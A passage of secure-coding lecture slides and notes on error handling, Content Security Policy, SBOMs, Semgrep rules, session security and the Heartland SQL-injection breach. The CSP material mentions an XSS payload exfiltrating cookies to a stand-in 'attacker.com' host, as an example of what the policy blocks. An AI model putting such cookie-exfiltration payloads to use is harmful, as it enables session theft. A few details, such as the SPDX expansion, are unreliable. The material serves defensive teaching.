- All exception details written only to the server-side log with authentication context.
:::
::::
::::

:::image src="images/23_secure_error_handling_pattern.png" alt="Split-screen diagram. Left side labeled 'Insecure Error Handling': a browser window showing a Java NullPointerException stack trace with class names, file paths, and database connection string including password visible in the exception message. Red annotation arrows point to specific lines highlighting the exposed information. Right side labeled 'Secure Error Handling': the same browser window shows only 'An error occurred. Reference ID: ERR-4a2b.' In the background, a server-side log panel shows the full stack trace, user ID, session token hash, timestamp, and request details, visible only to authorized operations staff. Green arrow shows the one-way flow: full details to logs, minimal details to user." caption="Secure error handling decouples the user-facing message (generic, safe) from the internal diagnostic record (detailed, access-controlled). Verbose error messages are CWE-209 violations that directly enable reconnaissance." width=full
:::

:::notes
Error handling is one of the most consistently overlooked areas of secure coding practice because it sits at the intersection of operational and security concerns. Developers naturally want verbose, detailed error output to facilitate debugging, and this is entirely reasonable during development. The failure occurs when that same verbose output reaches production systems where it is presented to unauthenticated or low-privileged users. CWE-209 (Generation of Error Message Containing Sensitive Information) captures this vulnerability pattern, which appears across all application types and programming languages.

The information exposed in insecure error messages spans several categories of intelligence value to an attacker. Technology fingerprinting information includes framework names and version numbers (e.g., "Spring Framework 5.3.2"), programming language runtimes (Java JVM version, Python interpreter version), and web server software (Apache Tomcat 9.0.41). This information directly enables an attacker to look up known CVEs for those specific versions and target exploitation attempts accordingly. Structural information includes database table names, column names, and schema structure exposed through SQL error messages; internal file system paths visible in file I/O exception messages; and internal network topology through IP addresses in connection refused errors. Authentication information includes the critically important distinction between "user not found" and "password incorrect" error messages, when these are distinct, an attacker can enumerate valid usernames by testing candidate usernames against the login form and observing which error message is returned. CWE-204 (Observable Response Discrepancy) addresses this specific enumeration vector. All authentication endpoints should return the identical message regardless of whether the failure was due to an invalid username or an incorrect password.

The secure error handling pattern requires two parallel outputs from every error condition. The user-facing output must be a generic message that provides enough information for the user to take action (contact support, try again later) without revealing any technical details. A correlation reference ID, a randomly generated token written into the error page and simultaneously into the server log, allows support staff to locate the specific detailed log entry that corresponds to a user's reported error without requiring the user to understand technical details. The internal log entry must contain the full exception details, the complete stack trace, the authenticated user's identity, the session ID (or a secure hash of it), the request method and URL, and a timestamp accurate to the millisecond.

Application logging must itself be implemented with security awareness. Logging frameworks that blindly log HTTP request parameters will log passwords submitted to login forms, OTP codes, and payment card numbers. OWASP recommends explicit parameter filtering to exclude fields named `password`, `token`, `api_key`, `credit_card`, and similar sensitive fields from request logs. NIST SP 800-53 Revision 5 control AU-3 (Content of Audit Records) specifies the required content of security audit records, and control AU-9 (Protection of Audit Information) requires that audit records be protected from unauthorized modification and deletion. ISO/IEC 27001:2022 Annex A control 8.15 (Logging) requires that event logs recording user activities, exceptions, and information security events are produced, stored, protected, and analyzed. The 2021 Log4Shell vulnerability (CVE-2021-44228) was itself triggered through log data, a reminder that logging infrastructure is itself an attack surface. Log4j's JNDI lookup feature, which evaluated JNDI expressions found within logged strings, was enabled by default and allowed attackers to achieve remote code execution simply by causing the application to log a crafted string, underscoring the importance of carefully controlling what the logging framework does with log data. A Shodan search for exposed Spring Boot Actuator endpoints returning full stack traces shows the real-world prevalence of information-exposure flaws (CWE-209): the volume of vulnerable public endpoints makes the risk concrete.
:::

%%%
---
unit: Testing
code: CSP
title: "Tool Spotlight: Content Security Policy (CSP)"
---
:::callout style=soft
**Content Security Policy (CSP)** is an HTTP response header that instructs the browser which sources of content (scripts, styles, images, fonts) are legitimate for a given page. A correctly configured CSP is one of the most effective browser-enforced defenses against XSS attacks.
:::

:::table
| CSP Directive | Controls | Secure Example Value |
|---|---|---|
| `script-src` | JavaScript source loading | `'self' https://cdn.example.com` |
| `style-src` | CSS source loading | `'self' 'nonce-abc123'` |
| `img-src` | Image sources | `'self' data: https://images.example.com` |
| `connect-src` | XHR/Fetch/WebSocket targets | `'self' https://api.example.com` |
| `default-src` | Fallback for unspecified directives | `'none'` |
| `frame-ancestors` | Pages that may embed this page | `'none'` (prevents clickjacking) |
| `report-uri` / `report-to` | Violation reporting endpoint | `/csp-report-endpoint` |
:::

:::image src="images/23_csp_header_enforcement.png" alt="Browser-server interaction diagram showing CSP enforcement. Server sends HTTP response with Content-Security-Policy header listing: script-src 'self' https://trusted-cdn.com; img-src 'self' data:; default-src 'none'. Browser parses the header and builds an internal allowlist. Three subsequent resource requests are shown: (1) Script from https://trusted-cdn.com/lib.js, green checkmark, allowed by script-src. (2) Inline script tag without nonce, red X, blocked by script-src missing 'unsafe-inline'. (3) Script from https://attacker.com/steal.js (XSS payload), red X, blocked as not in allowlist. Console shows CSP violation report sent to report-uri endpoint. Clean technical diagram, labeled, white background." caption="CSP enforcement is performed by the browser: when a page attempts to load a resource from a source not listed in the policy, the browser blocks the load and optionally reports the violation. This stops XSS payloads that the server failed to prevent." width=full
:::

:::notes
Content Security Policy is an HTTP response header standard defined in the W3C Content Security Policy Level 3 specification that provides a browser-enforced layer of defense against content injection attacks, most notably Cross-Site Scripting. The fundamental principle of CSP is an allowlist model applied at the browser level: the server declares in a response header which sources of scripts, stylesheets, images, fonts, and other resources are legitimate for this page, and the browser refuses to load or execute any resource that does not come from an approved source. This defense operates independently of server-side input validation and output encoding, providing a defense-in-depth layer that can contain XSS payloads that managed to bypass server-side controls.

The most security-critical CSP directive is `script-src`, which controls which origins may provide JavaScript that the browser will execute. The most common and dangerous CSP misconfiguration is including `'unsafe-inline'` in `script-src`, which permits inline `<script>` tags and event handler attributes, precisely the vectors that XSS payloads use. A strict CSP eliminates `'unsafe-inline'` and instead uses cryptographic nonces or hashes to authorize specific inline scripts. A nonce is a randomly generated, per-request token that the server generates, includes in the CSP header as `'nonce-abc123'`, and adds as a `nonce="abc123"` attribute to each legitimate inline `<script>` tag. The browser only executes inline scripts that carry a matching nonce. Because an XSS attacker cannot predict the nonce value (it is regenerated for each response), injected inline scripts will not carry the nonce and will be blocked by the browser even if they appear in the page body. The cryptographic hash approach is similar: the server computes the SHA-256 hash of each legitimate inline script's content, includes the hash in the CSP header as `'sha256-<hash>'`, and the browser verifies the hash of every inline script before executing it.

CSP also provides protection against data exfiltration through the `connect-src` directive, which restricts the origins to which `XMLHttpRequest`, `fetch()`, `WebSocket`, and similar APIs can connect. A stored XSS payload that attempts to exfiltrate session cookies to `https://attacker.com/steal` will be blocked if `connect-src` does not include `https://attacker.com`. The `frame-ancestors` directive prevents clickjacking by specifying which origins may embed the page in an `<iframe>`, replacing the older `X-Frame-Options` header with more granular control.

The `report-uri` and `report-to` directives instruct the browser to send a JSON violation report to a specified endpoint whenever a resource is blocked by the policy. This reporting capability is critical for two reasons: first, it allows security teams to detect active XSS attacks in production, because an attacker who successfully injects a script that the CSP blocks will generate a violation report that reveals the attack attempt; second, it enables safe incremental CSP deployment using the `Content-Security-Policy-Report-Only` header, which enforces none of the policy directives but generates violation reports for everything that would have been blocked. Deploying in report-only mode first, monitoring the reports, and iteratively refining the policy before switching to enforcement mode prevents CSP from breaking legitimate site functionality.

CSP has well-documented limitations that developers must understand. CSP protects against script execution but does not prevent the initial injection into the database that creates stored XSS. If a site does not eliminate `'unsafe-inline'` and `'unsafe-eval'`, the CSP provides minimal protection against XSS. CSP does not protect against CSRF or clickjacking (beyond `frame-ancestors`). Browser support is broad and consistent across all modern browsers, but legacy browser versions may not support CSP Level 3 directives. NIST SP 800-53 Revision 5 control SI-10 and the OWASP Secure Headers Project both recommend CSP as a required security header. Tools like Mozilla Observatory, SecurityHeaders.com, and the Google CSP Evaluator provide automated CSP quality assessment against known bypass techniques, and integration of these tools into CI/CD pipelines ensures that CSP regressions are caught before deployment.
:::

%%%
---
unit: SDLC
code: SBM
title: "Supply Chain Security: SBOMs and Dependency Management"
---
:::callout style=soft
Modern applications are built predominantly from third-party open-source components. A **Software Bill of Materials (SBOM)** is a machine-readable inventory of all components in an application, enabling rapid CVE impact assessment. U.S. Executive Order 14028 mandates SBOMs for federal software suppliers.
:::

:::list style=tight
- **Transitive Dependencies**: Directly declared dependencies (e.g., `express`) pull in dozens of indirect transitive dependencies (e.g., `qs`, `body-parser`). Vulnerabilities often exist in transitive, not direct, dependencies.
- **SBOM Formats**: Two standardized SBOM formats are widely adopted: **SPDX** (ISO/IEC 5962:2021, developed by Linux Foundation) and **CycloneDX** (OWASP project). Both express component name, version, license, and supplier in a machine-parseable format (JSON, XML, or tag-value).
- **SCA Tooling**: Tools including OWASP Dependency-Check, Snyk, Dependabot, and GitHub Advanced Security continuously compare the SBOM against NVD and GitHub Advisory Database, alerting when a new CVE affects a listed component.
- **Pinned Dependencies**: Lock files (`package-lock.json`, `Pipfile.lock`, `poetry.lock`, `Gemfile.lock`) pin transitive dependency versions, preventing automatic resolution of newer (potentially vulnerable or malicious) versions.
- **Typosquatting Risk**: Attackers publish malicious packages with names visually similar to popular packages (e.g., `cros-fetch` vs. `cross-fetch`). Careful review of new dependency additions and automated name-similarity checking mitigates this risk.
- **Signed Commits and Releases**: Verifying cryptographic signatures on package releases and commits (npm provenance, PyPI attestations, Maven Central signing) ensures the published package was built from the expected source by the expected author.
:::

:::image src="images/23_sbom_supply_chain_diagram.png" alt="Layered supply chain diagram on white background. Top layer: Your Application code. Second layer: Direct Dependencies (5 packages, labeled with names). Third layer: Transitive Dependencies of direct dependencies (22 packages, smaller boxes, some with red CVE badges). Fourth layer: OS base image and runtime libraries. An SBOM document icon on the right spans all layers with a bracket labeled 'SBOM: complete component inventory.' An SCA tool icon connects to an NVD database icon with a scanning arrow, and an alert icon flags the transitive dependency boxes bearing CVE badges. A supply chain attack scenario (Solar Winds-style, shown in orange) illustrates a malicious package inserted at the transitive dependency layer, highlighted to show how the SBOM enables rapid detection." caption="The SBOM provides complete visibility into all layers of the application's component supply chain. Without an SBOM, organizations cannot answer 'are we affected?' within hours of a new CVE disclosure, as Log4Shell demonstrated at scale." width=full
:::

:::notes
The software supply chain attack surface has grown dramatically as modern development practices have converged on heavy reuse of open-source packages. A typical Node.js web application may declare twenty to thirty direct dependencies in its `package.json`, but those direct dependencies collectively pull in hundreds or thousands of transitive dependencies. The average npm package depends on an average of 39 other packages across the full transitive dependency tree, according to analysis by Synk Research. This means the application's true attack surface through third-party code is orders of magnitude larger than the direct dependency list suggests, and vulnerabilities in transitive dependencies, packages the development team has never directly evaluated or chosen, constitute the majority of supply chain risk.

The Software Bill of Materials concept predates software security by decades; it was borrowed from the manufacturing industry, where a bill of materials lists every component and sub-component used in a physical product. Applied to software, the SBOM is a structured, machine-readable inventory of every component, library, and module included in an application, along with version information, licensing terms, and provenance data. The two competing SBOM standards, SPDX (System Package Data Exchange, now ISO/IEC 5962:2021) and CycloneDX (an OWASP project), both produce interoperable formats that SCA tools can consume to perform automated vulnerability correlation. When a new CVE is published in the NVD, an organization with a current SBOM can immediately query it: "Which of our applications contain Apache Log4j between versions 2.0 and 2.14.1?" and receive an answer within seconds rather than days of manual dependency auditing.

The 2020 SolarWinds SUNBURST attack is the defining example of supply chain compromise. Attackers gained access to the SolarWinds build environment and injected malicious code into the Orion software build pipeline. The malicious code was compiled into a legitimate, digitally signed software update that was distributed to approximately 18,000 SolarWinds customers, including U.S. federal agencies. The attack bypassed all traditional endpoint security controls because the payload arrived as a trusted, signed software update from a trusted vendor. Post-incident investigation revealed that many affected organizations had no SBOM for the SolarWinds Orion product and no process for verifying the integrity of vendor-supplied software updates against a known-good baseline. NIST SP 800-161 Revision 1 (Cybersecurity Supply Chain Risk Management Practices) and the subsequent CISA guidance on SBOM adoption formalized the organizational response: supply chain security requires an inventory (the SBOM), continuous monitoring of that inventory against known vulnerability databases (SCA), and cryptographic verification that delivered artifacts match expected hashes (software attestation). PCI-DSS 4.0 Requirement 6.3.3 mandates that all software components are protected from known vulnerabilities by installing applicable security patches or updates, implicitly requiring a component inventory equivalent to an SBOM.

Dependency pinning through lock files is a complementary control. Lock files capture the exact resolved version of every direct and transitive dependency at a point in time when the application was known to be correct and secure. By committing lock files to version control and using them in CI/CD builds (`npm ci`, `pip install --require-hashes`), teams ensure that every build uses exactly the same dependency versions, preventing automatic resolution of newer versions that might introduce new vulnerabilities or breaking changes. When a lock file is updated (for a security patch or feature addition), the change appears as a clearly reviewable diff in the pull request, allowing developers and security reviewers to audit exactly which dependency versions changed and why. Software composition analysis tools such as npm audit and pip-audit surface known CVEs in a project's dependency tree during development, including transitive dependencies a developer never chose directly.
:::

%%%
---
unit: Testing
code: SEM
title: "Tool Spotlight: Semgrep for SAST"
---
:::callout style=soft
**Semgrep** is an open-source, pattern-based static analysis tool that allows security teams to write custom rules in a language-agnostic syntax that closely mirrors the code pattern being searched. It runs in seconds on large codebases and integrates directly into CI/CD pipelines.
:::

::::columns ratio=1:1
::col::
:::code language=yaml caption="Semgrep rule detecting raw SQL string concatenation in Python"
rules:
  - id: python-sql-injection-f-string
    languages: [python]
    message: |
      Possible SQL injection: user-controlled value
      interpolated directly into SQL string. Use
      parameterized queries instead.
    severity: ERROR
    patterns:
      - pattern: |
          $CURSOR.execute(f"... {$USER_INPUT} ...")
      - pattern-not: |
          $CURSOR.execute("SELECT ...", (...))
    metadata:
      cwe: CWE-89
      owasp: A03:2021
      references:
        - https://owasp.org/www-community/attacks/SQL_Injection
:::
::col::
:::list style=tight
- **Rule Syntax**: Semgrep rules use YAML with `pattern`, `pattern-not`, `pattern-either`, and `pattern-inside` combinators to express complex vulnerability patterns simply.
- **Language Support**: Python, JavaScript/TypeScript, Java, Go, C/C++, Ruby, PHP, Scala, and more.
- **Registry**: The Semgrep Registry provides 3,000+ community rules covering OWASP Top 10, CWE Top 25, and language-specific secure coding standards.
- **CI Integration**: `semgrep ci` integrates with GitHub Actions, GitLab CI, Jenkins, and CircleCI; findings are reported as pull request comments.
- **IDE Plugin**: Real-time feedback in VS Code and JetBrains IDEs via the Semgrep extension surfaces findings while the developer is writing the vulnerable code.
:::
::::

:::image src="images/23_semgrep_sast_workflow.png" alt="Developer workflow diagram showing Semgrep integration at three points. Point 1: IDE, developer types Python code with f-string SQL query, Semgrep VS Code extension underlines the vulnerable pattern in red, hover tooltip shows 'CWE-89: SQL Injection, use parameterized queries.' Point 2: Pre-commit hook, terminal window shows git commit being run, pre-commit hook executes semgrep scan, single rule match is printed with file name, line number, severity ERROR, and remediation message, commit is blocked. Point 3: CI Pipeline, GitHub Actions workflow shows semgrep ci step running, finding reported as inline pull request review comment on the specific line with the vulnerability, PR merge is blocked. All three points connected by a timeline arrow labeled 'Developer commits code.'" caption="Semgrep provides security feedback at three progressively later, and more expensive, points in the development workflow: IDE (cheapest), pre-commit hook, and CI pipeline (most visible). Catching findings in the IDE eliminates them before they ever enter the repository." width=full
:::

:::notes
Semgrep (Semantic Grep) is an open-source static analysis engine developed by r2c (now Semgrep Inc.) that addresses two of the most significant practical limitations of traditional SAST tools: slow scan speeds that make CI integration painful, and opaque rule syntax that requires specialized tool expertise to write custom rules for organization-specific patterns. Semgrep's architecture uses a pattern-matching engine that operates on parsed abstract syntax trees (ASTs) rather than raw text, allowing rules to match code semantically, capturing all syntactic variations of a pattern, including different whitespace, variable naming, and code formatting, while still being expressed in syntax that closely resembles the actual source code being analyzed. A Semgrep rule to detect format string interpolation in database calls looks almost exactly like the code pattern it matches, making rule writing accessible to developers and security engineers who are not compiler experts.

The example rule shown in the slide illustrates the key Semgrep rule mechanics. The `patterns` key with multiple sub-patterns under it applies an AND condition: the finding is only reported when both sub-patterns match. The first pattern matches any call to a cursor's `execute()` method where the first argument is an f-string containing a variable (`$USER_INPUT` is a metavariable that matches any expression). The second pattern, prefixed with `pattern-not`, excludes the case where `execute()` is called with a separate parameters tuple as the second argument, the correct parameterized query form. This combination precisely targets the vulnerable pattern while excluding the correct implementation, minimizing false positives. The `metadata` section links the finding to CWE-89 and OWASP A03:2021, enabling integration with vulnerability management systems that use these identifiers for tracking and reporting.

The Semgrep Registry, available at semgrep.dev/r, contains over 3,000 rules contributed by the security community, r2c's security research team, and major technology organizations. Categories include OWASP Top 10 coverage, CWE Top 25 coverage, framework-specific rules (Django security, Flask security, Spring Security, Rails security), cloud provider SDK security rules (AWS SDK, Azure SDK, GCP SDK), and language-specific secure coding standard rules. Running `semgrep --config=p/owasp-top-ten .` against a codebase in a CI pipeline executes the full OWASP Top 10 rule set against every file in the repository in seconds, providing comprehensive coverage with a single command.

Semgrep's performance advantage over traditional AST-based SAST tools is substantial. Semgrep scans typically complete in under thirty seconds for codebases with hundreds of thousands of lines of code, making it practical to run on every push and pull request without adding meaningful latency to the CI pipeline. Traditional enterprise SAST tools often require scans of fifteen to sixty minutes or longer, which developers routinely disable or ignore for being too slow. Speed is not merely a convenience feature in security tooling, a tool that does not fit naturally into the development workflow will be bypassed or disabled, regardless of its technical quality. Semgrep's sub-minute scan times mean it can operate as a pre-commit hook, providing findings before code enters the repository, achieving the earliest and cheapest possible vulnerability detection. NIST SP 800-218 (SSDF) practice PW.7.2 recommends that organizations run automated static analysis against all new code changes, and Semgrep's CI integration directly enables this at the earliest feasible point in the pipeline.
:::

%%%
---
unit: SDLC
code: AUTH
title: "Secure Authentication and Session Management"
---
:::callout style=soft
**Authentication** (verifying who the user is) and **Session Management** (maintaining that identity across requests) are among the most commonly exploited application security weaknesses, covered under OWASP A07:2021 – Identification and Authentication Failures.
:::

:::table
| Vulnerability | CWE | Correct Control |
|---|---|---|
| Weak password storage (MD5/SHA-1) | CWE-916 | Argon2id, bcrypt, or scrypt with appropriate work factor |
| Missing brute-force protection | CWE-307 | Rate limiting + account lockout + CAPTCHA on login |
| Predictable session token | CWE-330 | 128-bit+ cryptographically random token via CSPRNG |
| Missing `HttpOnly` on session cookie | CWE-1004 | `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict` |
| Unlimited session lifetime | CWE-613 | Idle timeout (15–30 min), absolute max lifetime (8–24 h) |
| No MFA option | – | TOTP-based MFA (RFC 6238) or FIDO2/WebAuthn |
| Session not invalidated on logout | CWE-613 | Server-side session store deletion on logout |
:::

:::image src="images/23_secure_session_lifecycle.png" alt="Session lifecycle state diagram on white background. States represented as rounded boxes: Unauthenticated → (successful login with MFA) → Session Created. Session Created node shows session token properties in a callout: 128-bit CSPRNG, HttpOnly, Secure, SameSite=Strict, 30-min idle timeout, 8-hour max lifetime. From Session Created: (idle for 30 min) → Session Expired (idle timeout). (8 hours elapsed) → Session Expired (absolute timeout). (user clicks logout) → Session Invalidated (server-side token deleted from store). (user re-accesses after expiry) → back to Unauthenticated. Password reset flow shown in a sidebar: reset link sent to verified email, link contains single-use token, token expires in 15 minutes, used once invalidated." caption="Secure session lifecycle: sessions are created only after successful authentication (with MFA), bounded by both idle and absolute timeouts, and explicitly invalidated on logout with server-side deletion of the session token." width=full
:::

:::notes
Authentication and session management failures consistently rank among the top three most exploited vulnerability categories in web applications, appearing as OWASP A07:2021 – Identification and Authentication Failures and contributing to a substantial fraction of publicly disclosed data breaches. The scope of this category is broad: it encompasses how user identity is verified at login, how credentials are stored, how the verified identity is maintained across requests through sessions or tokens, and how sessions are terminated securely. Failures in any of these sub-areas can allow attackers to assume the identity of legitimate users, bypass authentication entirely, or maintain persistent unauthorized access after a legitimate user has logged out.

Password storage is the foundational authentication security control. Passwords must never be stored in plaintext or using reversible encryption. The correct control is one-way adaptive hashing using a password hashing function specifically designed for this purpose: Argon2id (the winner of the Password Hashing Competition, 2015), bcrypt (the long-standing industry standard), or scrypt. These algorithms are intentionally slow and computationally expensive, designed to make offline brute-force attacks against stolen password hashes economically infeasible. The "adaptive" property refers to the work factor parameter (cost factor for bcrypt, time/memory/parallelism parameters for Argon2id) that can be increased as hardware becomes more powerful, maintaining the same computational expense for legitimate logins while escalating the cost for attackers. MD5 and SHA-1, which remain common in legacy applications, are cryptographic hash functions designed for speed, not password storage, a modern GPU can compute billions of MD5 hashes per second, making offline dictionary attacks against MD5-hashed password databases trivial. CWE-916 (Use of Password Hash With Insufficient Computational Effort) covers this failure. The 2012 LinkedIn breach, which exposed 117 million password hashes, is the canonical example: LinkedIn used unsalted SHA-1, allowing crackers to reverse 90% of the hashes within days of the dump's publication.

Session token security requires that every token be generated using a cryptographically secure pseudorandom number generator (CSPRNG). Standard pseudorandom generators (`Math.random()` in JavaScript, `random.random()` in Python) are not suitable for security purposes because they are predictable given sufficient observed output. CWE-330 (Use of Insufficiently Random Values) covers this failure. The token must be at least 128 bits (16 bytes) in length to be resistant to brute-force guessing, even given the birthday paradox. The session cookie must carry three security flags: `HttpOnly` prevents client-side JavaScript from reading the cookie (mitigating session theft via XSS), `Secure` restricts the cookie to HTTPS connections only (preventing transmission over unencrypted HTTP), and `SameSite=Strict` or `SameSite=Lax` prevents the cookie from being sent with cross-site requests (mitigating CSRF). Session tokens must have both idle timeouts, where an inactive session expires after a period of inactivity, and absolute maximum lifetimes, where a session expires regardless of activity after a maximum total duration. And critically, logout must result in server-side deletion of the session record; merely deleting the client-side cookie without invalidating the server-side session allows an attacker who obtained the token to continue using it after the legitimate user has logged out. CWE-613 (Insufficient Session Expiration) covers this failure.

Multi-factor authentication is now considered a baseline requirement rather than an advanced security feature. NIST SP 800-63B (Digital Identity Guidelines, Authentication) classifies authentication assurance levels and mandates MFA for access to any system handling sensitive data, explicitly deprecating SMS as an MFA factor due to SIM-swapping vulnerabilities in favor of TOTP-based authenticator apps (RFC 6238, implemented by Google Authenticator, Authy, and Microsoft Authenticator) and FIDO2/WebAuthn hardware security keys (which provide phishing-resistant authentication through public-key cryptography tied to the origin domain).
:::

%%%
---
unit: Testing
code: CHK2
title: "Mid-Lecture Checkpoint: SDLC and Testing"
---
:::callout style=soft
Consolidation checkpoint: verify your understanding of SDLC, threat modeling, AST methodologies, and session security before the final topic cluster.
:::

:::list style=tight
- **Q1**: At which SDLC phase does threat modeling occur, and why is this timing significant from a cost perspective?
- **Q2**: A developer says "we run DAST, so we don't need SAST." What is wrong with this reasoning? Name one vulnerability category that DAST finds well but SAST misses, and one that SAST finds well but DAST misses.
- **Q3**: What is the critical difference between CWE-89 (SQL Injection) and CWE-79 (XSS) in terms of which interpreter is targeted?
- **Q4**: A session cookie has `Secure` and `HttpOnly` but no `SameSite` attribute. What attack does the missing `SameSite` attribute enable?
- **Q5**: Describe two specific pieces of information that should appear in an internal server error log but must never appear in the user-facing error message.
:::

:::image src="images/23_checkpoint_sdlc_testing.png" alt="Quiz card layout on a white background with a purple accent bar labeled 'Checkpoint: SDLC and Testing'. Five numbered question cards arranged in two rows. Each card has a relevant icon: clock icon (Q1, timing), SAST vs DAST scale icon (Q2), database vs browser icon (Q3), cookie settings icon (Q4), log file vs error page icon (Q5). Progress bar at the top shows position: 'Slides 10-17 of 30'. Clean, minimal academic style matching the first checkpoint slide." caption="Checkpoint: five concept questions verifying mastery of SDLC phase placement, AST methodology tradeoffs, injection interpreter distinctions, cookie security flags, and secure error handling principles." width=full
:::

:::notes
This second checkpoint arrives approximately midway through the lecture material, after the first cluster of SDLC and testing methodology content. As with the first checkpoint, the questions are designed to test conceptual understanding rather than rote memorization, and each question is constructed to reveal a specific common misconception that arises in student groups. Let us work through the expected answers.

Question 1 tests knowledge of where threat modeling belongs in the SDLC and the economic argument for shift-left security. The correct answer is the Design phase, after requirements are gathered but before implementation begins. The timing significance is the cost curve: IBM Research and the Systems Sciences Institute have both documented that the cost of fixing a security vulnerability discovered after production deployment is approximately 30 to 100 times higher than the cost of addressing the same vulnerability when identified during the design phase. A design-phase threat model produces security requirements that are addressed with no additional code, a developer simply codes the component correctly from the start. A post-deployment vulnerability requires a hotfix, regression testing, emergency deployment, potentially a breach notification process, and the associated legal and reputational costs.

Question 2 tests understanding of SAST and DAST complementarity. The statement "we run DAST so we don't need SAST" is incorrect because the two tools test different aspects of the application with different visibility. DAST finds vulnerabilities that manifest at runtime and in the deployment environment: runtime configuration errors, authentication header misconfiguration, SSL/TLS negotiation weaknesses, and server-side response behavior anomalies. DAST cannot tell you which line of code produced a finding. SAST finds vulnerabilities in the code itself: dead code that is never exercised in tests but could be triggered by an attacker, cryptographic API misuse, hard-coded credentials, and code-level injection patterns in untested code paths. A runtime DAST scan will not find a hard-coded database password in source code, because the password is never reflected in HTTP responses. A SAST scan will not find a misconfigured HTTP Strict Transport Security header, because that is a runtime server configuration, not a code pattern.

Question 3 tests understanding of the target interpreter distinction between CWE-89 and CWE-79. SQL injection (CWE-89) targets the database's SQL interpreter: user input is parsed by the SQL parser, which cannot distinguish between developer-written SQL and attacker-injected SQL syntax. XSS (CWE-79) targets the browser's HTML/JavaScript interpreter: user input is parsed by the browser's HTML parser and JavaScript engine, which similarly cannot distinguish between developer-authored HTML and attacker-injected script content. Understanding this distinction clarifies why the defenses differ: parameterized queries address the SQL interpreter by separating structure from data before the parser sees them; output encoding addresses the HTML/JavaScript interpreter by converting structural characters into their display equivalents before the browser parses them.

Question 4 tests knowledge of the SameSite cookie attribute's specific purpose. Without the `SameSite` attribute, or with `SameSite=None`, the browser will include the session cookie in cross-site requests, requests initiated from a different origin domain. This enables Cross-Site Request Forgery (CSRF) attacks, where an attacker tricks an authenticated user's browser into making a state-changing request to the target application from a page the attacker controls. `SameSite=Strict` prevents the cookie from being sent on any cross-site request; `SameSite=Lax` (now the browser default in most modern browsers) allows the cookie on top-level navigational GET requests but blocks it on cross-site POSTs and embedded requests.

Question 5 tests understanding of the secure error handling principle of information separation. Internal log entries should contain: the full exception stack trace (including class names, method names, and line numbers); the complete error message including any values that caused the exception; the authenticated user's identity (user ID, username) and session identifier hash; the HTTP request method, URL, and relevant request headers; the timestamp with millisecond precision; and the server's internal component identifier. None of these should appear in the user-facing error message. The user should see only a generic statement ("An error occurred") with a reference ID that allows support staff to locate the corresponding internal log entry without the user needing to understand technical details. A real error page that leaks a stack trace reveals framework versions, file paths, library names and sometimes query fragments; enumerating what an attacker could extract from it, and how it narrows the search for an exploit, shows why verbose errors must be suppressed in production.
:::

%%%
---
unit: Prepared Statements
code: CSR
title: "Case Study: Heartland Payment Systems Breach (2008)"
---
:::callout style=soft
The **2008 Heartland Payment Systems breach**, enabled by SQL injection against a web application, resulted in the theft of over **130 million credit card numbers** and remains one of the most consequential application-layer attacks in history.
:::

:::steps
1. **Initial Reconnaissance**: Attackers (led by Albert Gonzalez) identified Heartland's payment processing web application as a target through industry research and network scanning.
2. **SQL Injection Exploitation**: Attackers exploited an SQL injection vulnerability in Heartland's web application, built on string-concatenated queries, to gain access to the internal payment processing network.
3. **Malware Installation**: Once inside the network, attackers installed memory-scraping malware on the servers processing payment card data. The malware captured card data in transit, before encryption, as it was being processed.
4. **Exfiltration**: Card data (track 1 and track 2 magnetic stripe data) was exfiltrated to attacker-controlled servers over encrypted channels, evading network-level inspection.
5. **Discovery and Disclosure**: Heartland discovered the breach in January 2009 during a Visa/Mastercard investigation. The company disclosed the breach publicly on January 20, 2009.
6. **Consequences**: Heartland paid over $130 million in fines and settlements to Visa, Mastercard, and American Express. Albert Gonzalez received a 20-year federal prison sentence. Heartland subsequently became the first payment processor to adopt end-to-end encryption as a business standard.
:::

:::image src="images/23_heartland_breach_timeline.png" alt="Horizontal timeline infographic on white background labeled 'Heartland Payment Systems Breach: 2007-2009.' Events marked as labeled points on the timeline: Mid-2007: Attackers identify target and begin reconnaissance. Early 2008: SQL injection exploits web application, network access gained. Mid-2008: Memory-scraping malware installed on payment processing servers. Late 2008: Card data exfiltration ongoing, 130M+ records captured over months. January 2009: Visa/Mastercard investigation triggers discovery. January 20, 2009: Public disclosure. 2009-2010: $130M+ settlements. 2010: Albert Gonzalez sentenced to 20 years. Icons at each milestone: magnifying glass (recon), syringe (injection), bug (malware), outbound arrow (exfiltration), magnifying glass over alert (discovery), newspaper (disclosure), gavel (settlements), prison bars (sentencing). Red accent color for attacker actions, blue for defensive/response actions." caption="The Heartland breach timeline: SQL injection provided initial access; the dwell time of over six months allowed massive-scale exfiltration before detection. A single parameterized query requirement would have prevented the initial access entirely." width=full
:::

:::notes
The Heartland Payment Systems breach is the most financially consequential SQL injection attack in documented history and serves as the definitive case study for the CWE-89 vulnerability class. Understanding the attack in detail, including the sequence of events, the enabling vulnerability, and the cascading consequences, provides developers with a concrete reference for the real-world stakes of seemingly abstract secure coding practices.

Heartland Payment Systems was, at the time of the breach, one of the largest payment card processors in the United States, processing approximately 100 million card transactions per month for over 250,000 small and mid-sized merchants. The company's web application, which provided customer-facing services, contained at least one SQL injection vulnerability in its code, a place where a user-supplied value was incorporated into a SQL query through string concatenation rather than parameterization, following the exact vulnerable pattern shown in the SQL injection slide earlier in this lecture.

Albert Gonzalez, then 28 years old and already under investigation by the U.S. Secret Service for previous card theft operations (including the 2007 TJX Companies breach), had built a sophisticated criminal organization that specialized in identifying and exploiting SQL injection vulnerabilities in payment processing infrastructure. The group used automated scanning tools to identify potentially vulnerable web applications, then manually exploited identified vulnerabilities to gain database access. In Heartland's case, the SQL injection vulnerability provided access to the internal payment processing network, the network segment on which servers were decrypting and re-encrypting card data during processing.

The crucial innovation in the Heartland attack was not the SQL injection itself, but what the attackers did once inside. Rather than attempting to query the database directly for stored card data (which was encrypted at rest), they installed custom memory-scraping malware on the Windows servers running the payment processing software. During the brief window when a payment card transaction is processed, the card's track data exists in server memory in plaintext, decrypted for processing and not yet re-encrypted for storage or transmission. The malware captured this in-memory plaintext data and staged it for exfiltration. This technique, which would later be called "RAM scraping," was sufficiently novel in 2008 that Heartland's network monitoring tools did not detect it. The malware operated undetected for an estimated seven to nine months, exfiltrating card data over encrypted channels designed to blend in with normal HTTPS traffic, before investigators alerted Heartland in January 2009.

